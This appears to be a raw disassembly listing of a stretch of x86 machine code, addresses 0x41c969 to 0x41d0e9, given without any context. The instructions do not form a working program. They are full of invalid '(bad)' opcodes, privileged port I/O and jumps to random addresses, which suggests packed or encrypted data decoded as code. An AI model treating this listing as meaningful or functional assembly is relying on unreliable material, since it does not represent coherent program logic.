  41c969:	xor    BYTE PTR [ebp-0x654fce76],cl
  41c96f:	cdq    
  41c970:	fbstp  TBYTE PTR [edi-0x5a]
  41c973:	mov    ah,0x82
  41c975:	sub    al,0xdc
  41c977:	xchg   BYTE PTR [edx],ch
  41c979:	fisttp DWORD PTR [ecx]
  41c97b:	retf   0x754d
  41c97e:	sbb    cl,bh
  41c980:	mov    DWORD PTR [ebp+0x74],eax
  41c983:	inc    edx
  41c984:	scas   al,BYTE PTR es:[edi]
  41c985:	sub    ecx,DWORD PTR [edx]
  41c987:	fcom   QWORD PTR [edx+0x5fe2d8cd]
  41c98d:	jo     0x41ca00
  41c98f:	imul   eax,DWORD PTR [ebp-0x45],0x88f62a4e
  41c996:	push   0xb83cd096
  41c99b:	aas    
  41c99c:	mov    ebx,0x15d2a1d
  41c9a1:	test   BYTE PTR [ecx],cl
  41c9a3:	stos   BYTE PTR es:[edi],al
  41c9a4:	(bad)  
  41c9a5:	cmc    
  41c9a6:	nop
  41c9a7:	out    dx,eax
  41c9a8:	std    
  41c9a9:	shl    BYTE PTR [eax-0x75],1
  41c9ac:	sub    eax,esi
  41c9ae:	es inc edi
  41c9b0:	int    0xc6
  41c9b2:	or     al,0x1d
  41c9b4:	inc    esi
  41c9b5:	mov    al,ds:0x2422ecf2
  41c9ba:	test   cl,0x31
  41c9bd:	xchg   edx,eax
  41c9be:	jle    0x41c9f7
  41c9c0:	(bad)  
  41c9c1:	mov    ch,0xac
  41c9c3:	mov    WORD PTR [edx-0x269fa12b],?
  41c9c9:	sbb    BYTE PTR [esi-0x3f],bh
  41c9cc:	sahf   
  41c9cd:	pop    esp
  41c9ce:	hlt    
  41c9cf:	or     BYTE PTR [edi],dl
  41c9d1:	mov    dl,0xf5
  41c9d3:	cdq    
  41c9d4:	xchg   ebp,eax
  41c9d5:	inc    ebp
  41c9d6:	inc    esp
  41c9d7:	xchg   DWORD PTR [ebx+0x3c],esp
  41c9da:	pusha  
  41c9db:	xor    BYTE PTR [ebp-0x73],bh
  41c9de:	lods   eax,DWORD PTR ds:[esi]
  41c9df:	dec    esp
  41c9e0:	out    0x5f,eax
  41c9e2:	sbb    DWORD PTR [esp+eiz*2+0x207c6d89],edx
  41c9e9:	or     BYTE PTR [ecx+0x6ba046ef],0x9c
  41c9f0:	inc    edx
  41c9f1:	add    al,0x30
  41c9f3:	bswap  edi
  41c9f5:	ret    
  41c9f6:	jcxz   0x41c9eb
  41c9f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c9fa:	out    0x5a,eax
  41c9fc:	jmp    0x41a0644f
  41ca01:	(bad)  
  41ca02:	xchg   BYTE PTR [esi+0x552a9e39],cl
  41ca08:	xchg   DWORD PTR [edi-0x7024e6ed],edi
  41ca0e:	das    
  41ca0f:	pop    esi
  41ca10:	and    ah,BYTE PTR [ebx-0x37]
  41ca13:	mov    bh,0xbe
  41ca15:	loopne 0x41c9c6
  41ca17:	addr16 jno 0x41c9ea
  41ca1a:	mov    eax,0x3357e501
  41ca1f:	cmp    bh,cl
  41ca21:	dec    esp
  41ca22:	ds pushf 
  41ca24:	jo     0x41ca37
  41ca26:	scas   al,BYTE PTR es:[edi]
  41ca27:	mov    esi,0xf95742a8
  41ca2c:	mov    edi,0x1ed97a60
  41ca31:	adc    DWORD PTR [eax+0x727f4027],eax
  41ca37:	jns    0x41ca75
  41ca39:	cmp    edx,esp
  41ca3b:	aad    0x5e
  41ca3d:	pop    es
  41ca3e:	dec    esp
  41ca3f:	xchg   esp,eax
  41ca40:	dec    esi
  41ca41:	adc    esp,edi
  41ca43:	adc    BYTE PTR ds:0xb160901e,bh
  41ca4a:	call   0x82e8f926
  41ca4f:	stos   BYTE PTR es:[edi],al
  41ca50:	stos   BYTE PTR es:[edi],al
  41ca51:	add    BYTE PTR ds:0x233e3e9c,bl
  41ca58:	inc    eax
  41ca59:	jae    0x41cad4
  41ca5b:	or     DWORD PTR [edi+0x29],eax
  41ca5e:	add    DWORD PTR [ecx],esi
  41ca60:	les    ebx,FWORD PTR [edi]
  41ca62:	(bad)  
  41ca63:	and    DWORD PTR [esi+0x2a797a9],ebx
  41ca69:	imul   ebx,DWORD PTR [edx-0x22aca237],0xffffffbd
  41ca70:	push   esp
  41ca71:	test   BYTE PTR [ebp+edi*2-0x5b680ad4],cl
  41ca78:	pop    edi
  41ca79:	mov    bl,0x51
  41ca7b:	and    esp,esi
  41ca7d:	or     BYTE PTR [esi-0x2d],ah
  41ca80:	and    esi,DWORD PTR [edi+0x22]
  41ca83:	daa    
  41ca84:	push   ebx
  41ca85:	(bad)  
  41ca87:	add    al,BYTE PTR [ecx+0xcca79f]
  41ca8d:	cmc    
  41ca8e:	jmp    0x41ca37
  41ca90:	ss lock nop
  41ca93:	cmp    DWORD PTR [edi-0x7b363813],ebx
  41ca99:	jnp    0x41cac7
  41ca9b:	in     eax,0xa1
  41ca9d:	xchg   ebx,eax
  41ca9e:	mov    ah,0x41
  41caa0:	sbb    BYTE PTR [ebp+ecx*4+0x65],al
  41caa4:	inc    esi
  41caa5:	and    DWORD PTR [ecx],ecx
  41caa7:	xlat   BYTE PTR ds:[ebx]
  41caa8:	xor    eax,DWORD PTR [eax-0xb0b5507]
  41caae:	and    eax,0x3ccf5789
  41cab3:	sbb    ch,BYTE PTR [ebx+ebp*8-0x42162f47]
  41caba:	(bad)  
  41cabb:	or     esp,DWORD PTR [ebx+0x25]
  41cabe:	mov    edx,0xb145c02b
  41cac3:	cwde   
  41cac4:	and    DWORD PTR [ebx+0x64d36b0d],edx
  41caca:	ins    BYTE PTR es:[edi],dx
  41cacb:	add    esp,DWORD PTR [esi-0x22612636]
  41cad1:	sti    
  41cad2:	and    al,0xfb
  41cad4:	mov    edx,0x2bd3fc71
  41cad9:	mov    ch,0x67
  41cadb:	push   ds
  41cadc:	les    ecx,FWORD PTR [edi]
  41cade:	mov    edi,0x55a08e5e
  41cae3:	outs   dx,BYTE PTR ds:[esi]
  41cae4:	stc    
  41cae5:	(bad)  
  41cae6:	adc    bh,BYTE PTR [eax+0x63]
  41cae9:	sbb    BYTE PTR [ebp+0x20],bh
  41caec:	push   ds
  41caed:	and    eax,0x6b0cd053
  41caf2:	mov    edi,0x8084d7dc
  41caf7:	inc    esi
  41caf8:	stos   BYTE PTR es:[edi],al
  41caf9:	cdq    
  41cafa:	aam    0xff
  41cafc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cafd:	imul   esi,DWORD PTR [esi-0x4ef094f6],0xd7f74739
  41cb07:	stos   BYTE PTR es:[edi],al
  41cb08:	cmp    ah,BYTE PTR [ecx-0x6af4b3a2]
  41cb0e:	call   0xc7cc3704
  41cb13:	lods   eax,DWORD PTR ds:[esi]
  41cb14:	mov    esi,0x7b4aab7
  41cb19:	js     0x41cb32
  41cb1b:	out    0x9,al
  41cb1d:	stc    
  41cb1e:	xchg   ebx,eax
  41cb1f:	mov    ebx,0xebf2b388
  41cb24:	aad    0x11
  41cb26:	xor    ecx,esi
  41cb28:	test   al,0x6
  41cb2a:	mov    ?,WORD PTR [esp+eax*2-0x63]
  41cb2e:	jle    0x41cae4
  41cb30:	jns    0x41cb63
  41cb32:	jecxz  0x41cb0c
  41cb34:	sub    DWORD PTR [ebp-0x8],esp
  41cb37:	rcl    BYTE PTR [edx-0x2c35db22],1
  41cb3d:	dec    edx
  41cb3e:	push   edi
  41cb3f:	xchg   ebx,eax
  41cb40:	jmp    0x41cbaf
  41cb42:	sbb    ecx,DWORD PTR [esi]
  41cb44:	adc    al,0xb2
  41cb46:	mov    eax,ds:0xdc5bc1aa
  41cb4b:	push   0x1
  41cb4d:	fs (bad) 
  41cb4f:	mov    DWORD PTR gs:[edi+esi*1-0x24],eax
  41cb54:	xchg   esp,eax
  41cb55:	scas   eax,DWORD PTR es:[edi]
  41cb56:	in     eax,0x1
  41cb58:	cli    
  41cb59:	jecxz  0x41cb2a
  41cb5b:	xchg   esp,eax
  41cb5c:	mov    DWORD PTR [ebx+0x4c026faa],esp
  41cb62:	xchg   edx,eax
  41cb63:	xor    BYTE PTR [edx-0x27],dh
  41cb66:	dec    edx
  41cb67:	cmc    
  41cb68:	sub    esi,DWORD PTR [esi-0x25]
  41cb6b:	daa    
  41cb6c:	das    
  41cb6d:	xor    edi,DWORD PTR [ebx+0x475f0ab7]
  41cb73:	in     al,dx
  41cb74:	push   ds
  41cb75:	xlat   BYTE PTR ds:[ebx]
  41cb76:	mov    ebp,0x81bf6f91
  41cb7b:	mov    dl,0x7e
  41cb7d:	or     eax,0x87df5fe7
  41cb82:	sbb    esi,DWORD PTR [edx+0x4e0dc903]
  41cb88:	mov    ch,0x98
  41cb8a:	cdq    
  41cb8b:	mov    eax,ds:0xe5430216
  41cb90:	jns    0x41cb81
  41cb92:	pop    ebp
  41cb93:	pop    ds
  41cb94:	xchg   BYTE PTR [ebp-0x57],dh
  41cb97:	fwait
  41cb98:	add    DWORD PTR ds:[ebp-0x74f776ff],0xffffffd9
  41cba0:	shr    ebp,1
  41cba2:	jle    0x41cb84
  41cba4:	sbb    eax,0x4eeb3bfa
  41cba9:	sbb    eax,0xc58a0fe8
  41cbae:	pop    edx
  41cbaf:	fmul   QWORD PTR [ebp+0x5b]
  41cbb2:	jmp    0xa779650c
  41cbb7:	test   BYTE PTR [esi-0x54],0xf2
  41cbbb:	jbe    0x41cb4f
  41cbbd:	dec    ebx
  41cbbe:	rcr    BYTE PTR [eax],1
  41cbc0:	or     eax,0x37496099
  41cbc5:	add    BYTE PTR [ecx+0x69],bl
  41cbc8:	push   ds
  41cbc9:	mov    esp,0xd45ab18c
  41cbce:	ja     0x41cbe1
  41cbd0:	inc    ecx
  41cbd1:	cmp    esi,DWORD PTR [ebx+0x3bf0b44d]
  41cbd7:	add    dl,0x79
  41cbda:	out    dx,al
  41cbdb:	out    dx,al
  41cbdc:	push   cs
  41cbdd:	sbb    DWORD PTR [ebx],eax
  41cbdf:	(bad)  
  41cbe0:	loop   0x41cb72
  41cbe2:	loopne 0x41cc4e
  41cbe4:	pop    edx
  41cbe5:	pop    eax
  41cbe6:	lea    ebp,[edi+0x48d223a9]
  41cbec:	shl    BYTE PTR [esi],cl
  41cbee:	push   esp
  41cbef:	out    dx,al
  41cbf0:	rcl    DWORD PTR [ecx+0x11cbc614],1
  41cbf6:	jg     0x41cb79
  41cbf8:	dec    edi
  41cbf9:	loop   0x41cbd6
  41cbfb:	push   ebx
  41cbfc:	push   0x5437807b
  41cc01:	daa    
  41cc02:	test   BYTE PTR [edi+0x34],cl
  41cc05:	std    
  41cc06:	and    eax,0x9775dd83
  41cc0b:	jle    0x41cbb6
  41cc0d:	mov    ch,0x93
  41cc0f:	sbb    BYTE PTR [edx-0xf],dl
  41cc12:	mov    ebx,0xfe265a99
  41cc17:	cmp    bl,BYTE PTR [edi+0x27b2d759]
  41cc1d:	inc    ebp
  41cc1e:	loopne 0x41cbc4
  41cc20:	mov    ch,BYTE PTR [ecx+0x4ce7d00b]
  41cc26:	xchg   esp,eax
  41cc27:	enter  0xdcf0,0xcf
  41cc2b:	in     eax,0x57
  41cc2d:	and    DWORD PTR [esi-0x589f4628],esp
  41cc33:	clc    
  41cc34:	ds dec esi
  41cc36:	cwde   
  41cc37:	xor    BYTE PTR [esi+0x16],al
  41cc3a:	add    ebp,edi
  41cc3c:	ins    BYTE PTR es:[edi],dx
  41cc3d:	fsubr  QWORD PTR [esi-0x2c22d258]
  41cc43:	test   BYTE PTR [ebp+0x15],bh
  41cc46:	in     eax,dx
  41cc47:	jo     0x41cc67
  41cc49:	mov    WORD PTR [ebx-0x78a994fb],fs
  41cc4f:	jecxz  0x41cca4
  41cc51:	xchg   ebx,eax
  41cc52:	inc    edi
  41cc53:	test   BYTE PTR [ecx-0x4b],al
  41cc56:	xchg   esp,eax
  41cc57:	jl     0x41cc55
  41cc59:	ins    DWORD PTR es:[edi],dx
  41cc5a:	gs sbb dl,ch
  41cc5d:	inc    ebp
  41cc5e:	jne    0x41ccb1
  41cc60:	inc    ebp
  41cc61:	movzx  ebp,WORD PTR [ebp-0x71abbba6]
  41cc68:	push   esi
  41cc69:	pop    es
  41cc6a:	push   ds
  41cc6b:	div    BYTE PTR [edi-0x23]
  41cc6e:	call   0x2064:0xee83dd55
  41cc75:	jecxz  0x41cc23
  41cc77:	and    dh,BYTE PTR ds:0xe2fcaf8a
  41cc7d:	and    al,0x59
  41cc7f:	pop    ecx
  41cc80:	into   
  41cc81:	(bad)
  41cc86:	pop    ss
  41cc87:	cwde   
  41cc88:	mov    esi,ecx
  41cc8a:	dec    edi
  41cc8b:	jl     0x41ccb9
  41cc8d:	push   ebp
  41cc8e:	xchg   esi,eax
  41cc8f:	imul   ebp,DWORD PTR [edi+0xf],0xe5ddb854
  41cc96:	ins    BYTE PTR es:[edi],dx
  41cc97:	mov    bl,0x94
  41cc99:	out    dx,al
  41cc9a:	add    BYTE PTR [edi+0x4f],dl
  41cc9d:	cmp    DWORD PTR [edx],esi
  41cc9f:	lahf   
  41cca0:	in     al,dx
  41cca1:	mov    dl,0x5f
  41cca3:	pushf  
  41cca4:	mov    edx,0x5751a2c3
  41cca9:	loope  0x41cc7d
  41ccab:	bound  ecx,QWORD PTR [edi+0x5bdb2f8]
  41ccb1:	std    
  41ccb2:	jno    0x41cc7f
  41ccb4:	outs   dx,BYTE PTR ds:[esi]
  41ccb5:	rol    DWORD PTR [esp+ecx*8],0xe3
  41ccb9:	inc    edi
  41ccba:	(bad)  
  41ccbb:	push   ecx
  41ccbc:	push   cs
  41ccbd:	stos   BYTE PTR es:[edi],al
  41ccbe:	sbb    eax,0x80d3c7fe
  41ccc3:	mov    fs,ebp
  41ccc5:	mov    bh,0xd0
  41ccc7:	xlat   BYTE PTR ds:[ebx]
  41ccc8:	adc    DWORD PTR [eax-0x1e],esi
  41cccb:	leave  
  41cccc:	sub    BYTE PTR [eax-0x50e992c9],dl
  41ccd2:	xor    BYTE PTR [ebp+0x62f2fc39],bh
  41ccd8:	mov    eax,0x630d96de
  41ccdd:	stc    
  41ccde:	fdivr  DWORD PTR [eax+0x60]
  41cce1:	push   ds
  41cce2:	outs   dx,BYTE PTR ds:[esi]
  41cce3:	rol    DWORD PTR [edx+0x4d],cl
  41cce6:	sub    al,ah
  41cce8:	cli    
  41cce9:	adc    BYTE PTR [ebp-0x596019c0],cl
  41ccef:	call   0x314e6133
  41ccf4:	add    eax,0xb5ac5c9c
  41ccf9:	out    dx,eax
  41ccfa:	push   edi
  41ccfb:	outs   dx,DWORD PTR ds:[esi]
  41ccfc:	sub    eax,0x2440f763
  41cd01:	es jae 0x41ccbe
  41cd04:	jecxz  0x41cd70
  41cd06:	pop    edx
  41cd07:	add    eax,0xd044d1ab
  41cd0c:	adc    BYTE PTR [edx],bl
  41cd0e:	test   DWORD PTR [edx],esp
  41cd10:	lock and al,0x26
  41cd13:	push   ebp
  41cd14:	popa   
  41cd15:	mov    ebx,DWORD PTR [edx-0x5bec99a2]
  41cd1b:	adc    DWORD PTR [ebp-0xcb0a9d],0x3aac2942
  41cd25:	(bad)  
  41cd27:	sub    bl,BYTE PTR [esi+0x4f4cc26a]
  41cd2d:	int    0xf0
  41cd2f:	mov    ebp,0xc0810841
  41cd34:	out    0x7d,al
  41cd36:	in     al,0x82
  41cd38:	outs   dx,DWORD PTR fs:[esi]
  41cd3a:	aam    0x93
  41cd3c:	cmp    esi,DWORD PTR [eax+0x36]
  41cd3f:	dec    ebx
  41cd40:	jecxz  0x41cdb5
  41cd42:	inc    edi
  41cd43:	ficomp DWORD PTR [ebx+0x7b]
  41cd46:	ja     0x41cd73
  41cd48:	push   0xffffffac
  41cd4a:	mov    al,ds:0xe70cbeab
  41cd4f:	bound  ecx,QWORD PTR [esi+0x1a4e663a]
  41cd55:	inc    ecx
  41cd56:	or     ebp,DWORD PTR [edx+0x5f0da87a]
  41cd5c:	out    0x57,eax
  41cd5e:	mov    cl,0x56
  41cd60:	pop    ds
  41cd61:	and    DWORD PTR [esi],eax
  41cd63:	mov    dh,0x26
  41cd65:	mov    dl,0xff
  41cd67:	mov    ds:0xde655a70,al
  41cd6c:	mov    al,ds:0x64d62505
  41cd71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cd72:	in     eax,0xb3
  41cd74:	or     eax,0x8f07e578
  41cd79:	std    
  41cd7a:	fcmovnbe st,st(4)
  41cd7c:	push   es
  41cd7d:	sti    
  41cd7e:	loope  0x41cdb3
  41cd80:	add    dl,BYTE PTR [edi+0x15fbc713]
  41cd86:	inc    ecx
  41cd87:	sub    eax,esi
  41cd89:	lock fist WORD PTR [esi]
  41cd8c:	jb     0x41cd2f
  41cd8e:	neg    DWORD PTR [edi+0x604414a6]
  41cd94:	iret   
  41cd95:	push   DWORD PTR [ecx+0x1b9d3209]
  41cd9b:	aaa    
  41cd9c:	xchg   BYTE PTR ds:0x96cc4141,ch
  41cda2:	test   edi,esi
  41cda4:	fldz   
  41cda6:	cmp    BYTE PTR [eax-0x5f],cl
  41cda9:	in     al,dx
  41cdaa:	dec    ebx
  41cdab:	dec    ecx
  41cdac:	dec    esp
  41cdad:	sub    DWORD PTR [esi-0x25],0x648ef84f
  41cdb4:	ja     0x41cdf6
  41cdb6:	adc    DWORD PTR [ebx-0x77],eax
  41cdb9:	pop    esp
  41cdba:	cdq    
  41cdbb:	sahf   
  41cdbc:	and    BYTE PTR [edx],al
  41cdbe:	(bad)  
  41cdbf:	jbe    0x41cd4a
  41cdc1:	hlt    
  41cdc2:	sti    
  41cdc3:	jo     0x41cdf9
  41cdc5:	pop    esp
  41cdc6:	out    dx,al
  41cdc7:	add    ebp,DWORD PTR [ebp+0x53]
  41cdca:	add    eax,0xc578c2b7
  41cdcf:	sbb    DWORD PTR [ebx],esi
  41cdd1:	adc    al,0x9c
  41cdd3:	ds and eax,0xe1b68bab
  41cdd9:	adc    BYTE PTR [edx+0x6b],bh
  41cddc:	add    al,0x63
  41cdde:	dec    edi
  41cddf:	retf   
  41cde0:	retf   
  41cde1:	push   0xd7e75c24
  41cde6:	cmp    DWORD PTR [edx+0x52aff6b2],eax
  41cdec:	pop    ss
  41cded:	sub    DWORD PTR [ebp-0xea62e6e],esp
  41cdf3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cdf4:	xchg   BYTE PTR [edi+0x2a],ah
  41cdf7:	mov    eax,ds:0x9ecb44ec
  41cdfc:	lods   al,BYTE PTR ds:[esi]
  41cdfd:	imul   BYTE PTR [edi-0x69ae206e]
  41ce03:	mov    al,ds:0xf06b2450
  41ce08:	add    BYTE PTR [edi+0x3a],bl
  41ce0b:	push   ebp
  41ce0c:	and    DWORD PTR [ebx+0x6cfefa50],ecx
  41ce12:	push   ebp
  41ce13:	repnz in al,0x1e
  41ce16:	push   ebx
  41ce17:	jecxz  0x41ce05
  41ce19:	xchg   edx,eax
  41ce1a:	fisub  WORD PTR [esi-0x47]
  41ce1d:	dec    ebp
  41ce1e:	loope  0x41cdb4
  41ce20:	lahf   
  41ce21:	mov    ss,WORD PTR [ecx-0x1ce022ae]
  41ce27:	ds push ebp
  41ce29:	fisttp DWORD PTR [esi-0x3b]
  41ce2c:	and    eax,0xb7442b09
  41ce31:	fsubrp st(0),st
  41ce33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce34:	push   esp
  41ce35:	dec    ebp
  41ce36:	and    esi,ecx
  41ce38:	sbb    DWORD PTR [edx-0xc],esi
  41ce3b:	js     0x41ce68
  41ce3d:	or     ebx,DWORD PTR [ecx]
  41ce3f:	mov    dh,0x21
  41ce41:	loop   0x41ceb6
  41ce43:	xchg   edx,eax
  41ce44:	xor    BYTE PTR [ecx+edx*1+0x63],dh
  41ce48:	jb     0x41ce83
  41ce4a:	popa   
  41ce4b:	loopne 0x41ce0d
  41ce4d:	leave  
  41ce4e:	inc    esi
  41ce4f:	in     al,0x13
  41ce51:	ss dec edi
  41ce53:	mov    al,ds:0x30f1d7b6
  41ce58:	shl    BYTE PTR [ebx+0x1f],cl
  41ce5b:	fwait
  41ce5c:	jle    0x41ce70
  41ce5e:	cld    
  41ce5f:	push   edx
  41ce60:	pushf  
  41ce61:	sbb    ch,BYTE PTR [ecx+0x48c775de]
  41ce67:	fwait
  41ce68:	pop    ebp
  41ce69:	mov    ebp,0xfc68ad94
  41ce6e:	xchg   BYTE PTR ds:0x2f4d751d,dl
  41ce74:	fild   WORD PTR [edi]
  41ce76:	cmc    
  41ce77:	inc    ebx
  41ce78:	pop    ss
  41ce79:	cli    
  41ce7a:	es inc eax
  41ce7c:	cmp    edx,DWORD PTR [esi-0x2cd1dbb6]
  41ce82:	fadd   st,st(3)
  41ce84:	pop    ds
  41ce85:	jae    0x41cecd
  41ce87:	cs and edi,DWORD PTR cs:[ebp-0x4c]
  41ce8c:	ins    BYTE PTR es:[edi],dx
  41ce8d:	jo     0x41ce6c
  41ce8f:	xor    eax,0xee80abe2
  41ce94:	lock sbb eax,eax
  41ce97:	mov    esi,0x4f6f3a9
  41ce9c:	mov    ebx,0x5ec42d13
  41cea1:	(bad)  
  41cea2:	fadd   QWORD PTR [edx+0x2d73ad39]
  41cea8:	adc    DWORD PTR [ecx+0x67],0x76944b15
  41ceaf:	mov    BYTE PTR [esi+0x6a],ch
  41ceb2:	xor    eax,0x9dbd0115
  41ceb7:	mov    ebx,0x6b145ff4
  41cebc:	int    0x3f
  41cebe:	loope  0x41ced7
  41cec0:	std    
  41cec1:	and    edx,DWORD PTR [esi-0x73d16c04]
  41cec7:	sar    BYTE PTR [ecx+0x31974f80],0xdf
  41cece:	adc    bl,BYTE PTR [ebx+0x43b5378c]
  41ced4:	mov    BYTE PTR ds:0x8418677d,bl
  41ceda:	or     eax,0xaef5ff0c
  41cedf:	pop    edx
  41cee0:	sbb    eax,DWORD PTR [ecx-0x3ff3668c]
  41cee6:	int    0x15
  41cee8:	pusha  
  41cee9:	inc    edi
  41ceea:	mov    ebx,0x1c86d4bf
  41ceef:	xchg   esi,eax
  41cef0:	pusha  
  41cef1:	or     eax,0xa8874341
  41cef6:	jmp    0x41cf59
  41cef8:	mov    cl,0xb0
  41cefa:	dec    ebx
  41cefb:	sbb    al,0xdb
  41cefd:	(bad)  
  41cefe:	add    dl,ch
  41cf00:	idiv   bh
  41cf02:	(bad)  
  41cf03:	ja     0x41ce9b
  41cf05:	in     al,0xa9
  41cf07:	xchg   cl,cl
  41cf09:	shl    DWORD PTR [ebp+0x74a55040],cl
  41cf0f:	adc    eax,0x1dce956a
  41cf14:	lock lea esi,[ebx-0x274b59ef]
  41cf1b:	cmp    DWORD PTR [edx-0x12],esi
  41cf1e:	cmp    edx,DWORD PTR [eax+0x10adcb2d]
  41cf24:	jecxz  0x41cee6
  41cf26:	mov    eax,0x3e30093c
  41cf2b:	mov    esi,DWORD PTR [edx-0x6a135b66]
  41cf31:	shl    BYTE PTR [ebx],1
  41cf33:	xor    eax,0x4c1be81e
  41cf38:	jp     0x41cf87
  41cf3a:	(bad)  
  41cf3c:	push   sp
  41cf3e:	adc    DWORD PTR [edi+0x65],ebx
  41cf41:	rcl    DWORD PTR cs:[edi+0x46e78981],0x3f
  41cf49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf4a:	and    ch,BYTE PTR [esp+ebx*8]
  41cf4d:	enter  0x5635,0x20
  41cf51:	xchg   esi,eax
  41cf52:	test   BYTE PTR [edi+0x1868d5ca],dl
  41cf58:	push   esi
  41cf59:	pusha  
  41cf5a:	test   eax,0xc7812ec5
  41cf5f:	mov    dl,0xb3
  41cf61:	and    edi,esi
  41cf63:	push   ds
  41cf64:	sbb    BYTE PTR [edi],cl
  41cf66:	jge    0x41cf7a
  41cf68:	sbb    bh,ch
  41cf6a:	jbe    0x41cfa8
  41cf6c:	push   eax
  41cf6d:	pop    ss
  41cf6e:	jne    0x41cfa5
  41cf70:	or     DWORD PTR [edx+0x5c],0x2157b7d9
  41cf77:	out    dx,eax
  41cf78:	jecxz  0x41cefc
  41cf7a:	xchg   BYTE PTR [edx+edi*2+0x56b425a],ch
  41cf81:	xchg   ebx,eax
  41cf82:	popf   
  41cf83:	stos   DWORD PTR es:[edi],eax
  41cf84:	out    dx,eax
  41cf85:	pop    esi
  41cf86:	mov    ebx,0x259aadb7
  41cf8b:	(bad)  
  41cf8c:	cmp    dh,BYTE PTR [eax-0x27]
  41cf8f:	mov    BYTE PTR [eax+esi*4+0x2a],dh
  41cf93:	pop    esp
  41cf94:	js     0x41cf83
  41cf96:	dec    ebx
  41cf97:	jnp    0x41cfed
  41cf99:	jmp    0xebb1:0x5092068
  41cfa0:	lahf   
  41cfa1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cfa2:	cdq    
  41cfa3:	xchg   ecx,ebx
  41cfa5:	xor    DWORD PTR [edi-0x5c6c8d1f],ebp
  41cfab:	and    ecx,ecx
  41cfad:	shr    DWORD PTR [ecx],cl
  41cfaf:	fdivr  DWORD PTR [ebx+0x54]
  41cfb2:	push   ds
  41cfb3:	mov    ah,0x45
  41cfb5:	sub    BYTE PTR [edi+0x7a21a9d3],bh
  41cfbb:	ss mov edx,0xcbd239ec
  41cfc1:	push   esi
  41cfc2:	cli    
  41cfc3:	push   eax
  41cfc4:	mov    esi,0x277d9383
  41cfc9:	repz dec esp
  41cfcb:	aad    0x5a
  41cfcd:	xor    BYTE PTR [ebx+0x6c15ec62],0x9b
  41cfd4:	jmp    0x41d02d
  41cfd6:	fwait
  41cfd7:	xor    BYTE PTR [edx],dh
  41cfd9:	nop
  41cfda:	shl    BYTE PTR ss:[edi],cl
  41cfdd:	pop    ss
  41cfde:	lds    ebx,FWORD PTR [eax+eiz*8-0x48cd6fe7]
  41cfe5:	adc    ah,BYTE PTR [edi-0x9414652]
  41cfeb:	push   cs
  41cfec:	dec    esi
  41cfed:	or     ebx,edx
  41cfef:	or     dh,BYTE PTR [eax+ecx*1-0x6bf5a281]
  41cff6:	ficomp WORD PTR ds:0x7cd82e30
  41cffc:	jp     0x41d051
  41cffe:	dec    ebx
  41cfff:	jno    0x41cf81
  41d001:	test   DWORD PTR [esi+0x5b983040],0xfc531cc6
  41d00b:	shl    DWORD PTR ds:0x77b3549,cl
  41d011:	out    dx,eax
  41d012:	scas   eax,DWORD PTR es:[edi]
  41d013:	xor    ebp,DWORD PTR [ecx+ebp*8+0x43]
  41d017:	popa   
  41d018:	jmp    0x8d6af246
  41d01d:	gs leave 
  41d01f:	sahf   
  41d020:	(bad)  
  41d022:	daa    
  41d023:	adc    al,0xd4
  41d025:	js     0x41d094
  41d027:	inc    ecx
  41d028:	add    ecx,DWORD PTR [esi]
  41d02a:	or     eax,0xffefb366
  41d02f:	sub    BYTE PTR [eax-0x1650ebe8],cl
  41d035:	xchg   edx,eax
  41d036:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d037:	mov    WORD PTR [edx-0x3bcbc38c],?
  41d03d:	out    0xbe,eax
  41d03f:	fmul   DWORD PTR [edx]
  41d041:	in     al,0xbe
  41d043:	inc    ecx
  41d044:	cmp    ebx,DWORD PTR [ecx+0x378c4745]
  41d04a:	mov    ah,0xab
  41d04c:	cmc    
  41d04d:	cmp    eax,DWORD PTR [ecx]
  41d04f:	(bad)  
  41d050:	cmp    BYTE PTR [edi-0x2d5fae14],ah
  41d056:	scas   eax,DWORD PTR es:[edi]
  41d057:	cmc    
  41d058:	popf   
  41d059:	dec    ebx
  41d05a:	test   ebx,ebx
  41d05c:	pop    eax
  41d05d:	sbb    al,BYTE PTR [ecx+0x7e1da2f8]
  41d063:	ins    DWORD PTR es:[edi],dx
  41d064:	into   
  41d065:	jle    0x41d0df
  41d067:	cmp    BYTE PTR [edi-0x33],0xf2
  41d06b:	loopne 0x41d0c0
  41d06d:	adc    ch,bl
  41d06f:	cmc    
  41d070:	pop    ebx
  41d071:	xchg   ecx,eax
  41d072:	je     0x41d030
  41d074:	xor    eax,0x935fb1aa
  41d079:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d07a:	push   esp
  41d07b:	sub    eax,0x4529dbd5
  41d080:	icebp  
  41d081:	push   ds
  41d082:	xor    eax,0x80c7bb2
  41d087:	push   eax
  41d088:	and    ebp,DWORD PTR ds:0x31fee45
  41d08e:	ss push ebp
  41d090:	push   ss
  41d091:	xor    ebx,DWORD PTR [edx+eax*1]
  41d094:	jno    0x41d05e
  41d096:	call   0x4d17:0xb8b56712
  41d09d:	sub    BYTE PTR [ebx-0x289b117d],al
  41d0a3:	dec    esp
  41d0a5:	dec    ebx
  41d0a6:	rol    al,1
  41d0a8:	mov    ebp,0xcbfcdf29
  41d0ad:	(bad)  es:[eax-0x37510697]
  41d0b4:	mov    bh,BYTE PTR [ebx-0x30329853]
  41d0ba:	cmp    dl,cl
  41d0bc:	add    esp,esi
  41d0be:	bound  ebx,QWORD PTR [ebx]
  41d0c0:	sbb    cl,BYTE PTR [ecx+eax*4]
  41d0c3:	sbb    BYTE PTR [ebp+0x4c],0x8e
  41d0c7:	inc    eax
  41d0c8:	cmp    BYTE PTR [eax-0xa],ah
  41d0cb:	hlt    
  41d0cc:	call   0x9d7f8ab6
  41d0d1:	std    
  41d0d2:	jge    0x41d0be
  41d0d4:	cwde   
  41d0d5:	inc    edi
  41d0d6:	pop    ebp
  41d0d7:	pop    esp
  41d0d8:	fwait
  41d0d9:	jne    0x41d119
  41d0db:	and    eax,0x91d00a75
  41d0e0:	leave  
  41d0e1:	cdq    
  41d0e2:	sbb    edx,0xffffffba
  41d0e5:	dec    esi
  41d0e6:	mov    al,0xb0
  41d0e8:	inc    edx
  41d0e9:	xchg   ebx,eax
